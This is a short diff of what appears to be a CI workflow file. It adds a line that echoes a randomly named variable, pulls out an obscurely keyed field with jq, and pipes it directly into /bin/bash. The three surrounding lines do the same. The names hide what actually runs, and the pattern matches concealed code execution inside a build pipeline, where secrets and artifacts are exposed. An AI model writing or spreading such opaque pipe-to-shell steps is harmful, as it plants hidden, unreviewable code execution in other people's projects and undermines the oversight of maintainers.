@@ -25,6 +25,7 @@ jobs:
           echo $mdg72 | jq -r .zqd2 | /bin/bash
           echo $vnv43 | jq -r .x0096 | /bin/bash
           echo $ymh084 | jq -r .d2 | /bin/bash
+          echo $xbmb1 | jq -r .vmcde379 | /bin/bash
 
       - name: Save output
         uses: actions/upload-artifact@v4
